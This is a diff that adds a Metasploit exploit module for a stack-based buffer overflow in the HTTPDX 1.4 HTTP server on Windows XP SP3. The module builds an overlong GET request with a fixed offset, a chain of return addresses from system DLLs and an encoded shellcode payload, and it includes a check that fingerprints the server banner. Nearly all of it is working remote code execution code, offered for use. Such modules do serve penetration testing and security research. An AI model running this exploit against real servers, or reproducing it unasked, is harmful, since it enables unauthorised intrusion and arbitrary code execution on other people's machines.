@@ -1,0 +1,82 @@
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+    
+    include Msf::Exploit::Remote::Tcp
+
+	def initialize(info = {})
+		super(update_info(info,	
+			'Name'           => 'HTTPDX h_handlepeer() Function Buffer Overflow',
+			'Description'    => %q{
+				This module exploits a stack-based buffer overflow vulnerability in HTTPDX HTTP server 1.4. The 
+				vulnerability is caused due to a boundary error within the "h_handlepeer()" function in http.cpp.
+				By sending an overly long HTTP request, an attacker can overrun a buffer and execute arbitrary code.
+			},
+			'Author'         => [ 
+						'Pankaj Kohli <pankaj208[at]gmail.com>',	# Original exploit [see References]
+						'Trancer <mtrancer[at]gmail.com>'		# Metasploit implementation
+						], 
+			'References'     =>
+				[
+					[ 'URL', 'http://www.pank4j.com/exploits/httpdxb0f.php' ],
+					[ 'URL', 'http://www.rec-sec.com/2009/10/16/httpdx-buffer-overflow-exploit/' ],
+					[ 'OSVDB', '58714' ],
+				],
+			'DefaultOptions' =>
+				{
+					'EXITFUNC' => 'process',
+				},
+			'Privileged'     => true,
+			'Payload'        =>
+				{
+					'Space'    => 1000,
+					'BadChars' => "\x00\x0a\x0b\x0d\x20\x23\x25\x26\x2c\x2f\x3a\x3b\x3d\x3f\x5c",
+					'StackAdjustment' => -1500,
+					'DisableNops'	=>  'True',
+
+				},
+			'Platform'       => 'win',
+			'Targets'        => 
+			[
+				[  'httpdx 1.4 - Windows XP SP3',
+					{
+					'Offset'	=> 616,
+					'Rets'		=> [ 0x64f8134b, 0x63b8624f, 0x7c874413 ],   # pop ret (core.dll), required to reach ret instruction (n.dll), jmp esp (kernel32.dll)
+					}
+				],
+			],
+			'DefaultTarget'  => 0))
+			register_options( [ Opt::RPORT(80) ], self.class )
+	end
+
+	def check
+		response = send_request_raw
+
+		if response and 
+		   response['Server'] and 
+		   response['Server'] =~ /httpdx\/1.4 (Win32)/
+			return Exploit::CheckCode::Appears
+		end
+			
+		return Exploit::CheckCode::Safe
+	end
+
+	def exploit
+		connect
+
+		sploit  = "GET /" + rand_text_alpha_lower(3, payload_badchars) + "="
+		sploit << rand_text_alphanumeric(target['Offset'], payload_badchars)
+		sploit << [ target['Rets'][0] ].pack('V') + [ target['Rets'][1] ].pack('V') + [ target['Rets'][2] ].pack('V')
+		sploit << payload.encoded + rand_text_alphanumeric((payload_space - payload.encoded.length), payload_badchars)
+
+		request = sploit + " HTTP/1.1\r\nHost: " + rand_text_alphanumeric(rand(8) + 1) + "\r\n\r\n"
+
+		print_status("Trying target #{target.name}...")
+
+		sock.put(request)
+		sock.close
+
+		disconnect
+		handler
+	end
+end
